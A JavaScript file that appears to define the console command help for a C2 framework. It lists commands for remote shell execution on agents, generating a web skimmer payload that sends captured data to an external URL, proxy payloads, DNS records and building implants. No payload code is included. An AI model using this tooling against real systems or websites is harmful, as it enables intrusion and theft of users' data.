import { Constants } from "../utils/utils";

export default class Helper {
    constructor() {}

    static Commands() {
        return {
            agent: {
                sysinfo: {
                    params: [],
                    desc: "get system info",
                },
                keyx: {
                    params: [],
                    desc: "start a key exchange with the agent",
                },
                agents: {
                    params: [],
                    desc: "show active agents",
                },
                interact: {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                shell: {
                    params: ["<command>"],
                    desc: "execute a shell command, alias: exec_cmd",
                },
                msg: {
                    params: ["<message>"],
                    desc: "send an encrypted message to the agent, requires keyx",
                },
                shutdown: {
                    params: ["<agent id>"],
                    desc: "shutdown the agent, confirm by entering the id, agent will not reconnect",
                },
                debug: {
                    params: [],
                    desc: "show verbose messages",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
                "set proxy_url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: Constants.VALID_URL_REGEX,
                },
                "set proxy_enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication",
                },
                "set proxy_key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication",
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to checkin with the c2 (dns or proxy)",
                    validate_regex: /^[0-9]+$/,
                },
                // "set domain": {
                //     params: ["<c2.domain.tld>"],
                //     desc: "set the c2 domain"
                // },
                // "set password": {
                //     params: ["<password>"],
                //     desc: "set the c2 password"
                // },
            },
            c2: {
                keyx: {
                    params: [],
                    desc: "start key exchange with all agents",
                },
                agents: {
                    params: [],
                    desc: "show active agents",
                },
                interact: {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                kill: {
                    params: ["<agent id>"],
                    desc: "deletes the agent from memory, agent may reconnect",
                },
                debug: {
                    params: [],
                    desc: "show verbose messages",
                },
                "use skimmer": {
                    params: [],
                    desc: "use the skimmer module",
                },
                "use proxy": {
                    params: [],
                    desc: "use the proxy module",
                },
                "use static_dns": {
                    params: [],
                    desc: "use the static_dns module to add or remove static dns records",
                },
                "use implant": {
                    params: [],
                    desc: "use the implant module to build agents",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
            },
            module_common: {
                reset: {
                    params: [],
                    desc: "reset config to .conf values",
                },
                config: {
                    params: [],
                    desc: "view config",
                },
                help: {
                    params: [],
                    desc: "show available commands",
                },
                back: {
                    params: [],
                    desc: "back to main menu",
                },
            },
            skimmer: {
                generate: {
                    params: [],
                    desc: "generate skimmer payload with the specified url and target classes and ids",
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the external skimmer c2 url (http://skimmer.url)",
                    validate_regex: Constants.VALID_URL_REGEX,
                },
                "set data_route": {
                    params: ["<route>"],
                    desc: "set the skimmer url data route (/stats)",
                    validate_regex: Constants.VALID_ROUTE_REGEX,
                },
                "set target_classes": {
                    params: ["<class 1,class 2,class 3>"],
                    desc: "(optional) target classes with skimmer click handler, separated by comma",
                    validate_regex: Constants.VALID_CLASS_ID_REGEX,
                },
                "set target_ids": {
                    params: ["<id 1,id 2,id 3>"],
                    desc: "(optional) target ids with skimmer click handler, separated by comma",
                    validate_regex: Constants.VALID_CLASS_ID_REGEX,
                },
            },
            proxy: {
                fetch: {
                    params: [],
                    desc: "force a fetch from the proxy",
                },
                generate: {
                    params: [],
                    desc: "generate proxy payload with the specified key",
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: Constants.VALID_URL_REGEX,
                },
                "set enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication channel",
                },
                "set key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication",
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to fetch data from proxy, in ms",
                },
            },
            static_dns: {
                add: {
                    params: ["<host>", "<ip>"],
                    desc: "add a static DNS A record",
                },
                delete: {
                    params: ["<host>"],
                    desc: "delete static DNS A record",
                },
            },
            implant: {
                build: {
                    params: ["[os]", "[arch]"],
                    desc: "build the agent for the target os and arch",
                },
                generate: {
                    params: ["[os]", "[arch]"],
                    desc: "alias for 'build'",
                },
                log: {
                    params: [],
                    desc: "show the build log",
                },
                "set os": {
                    params: ["<windows|linux|darwin|...>"],
                    desc: "set the target os for the build (GOOS)",
                    validate_regex: Constants.VALID_BUILD_TARGET_OS,
                },
                "set arch": {
                    params: ["<amd64|386|arm64|mips|...>"],
                    desc: "set the target arch for the build (GOARCH)",
                    validate_regex: Constants.VALID_BUILD_TARGET_ARCH,
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "set implant c2 query interval",
                },
                "set resolver": {
                    params: ["<ip:port>"],
                    desc: "set implant resolver ip:port (8.8.8.8:53)",
                    validate_regex: Constants.VALID_IMPLANT_RESOLVER,
                },
                "set debug": {
                    params: ["<1|0>"],
                    desc: "build debug version of the implant",
                },
            },
        };
    }
}
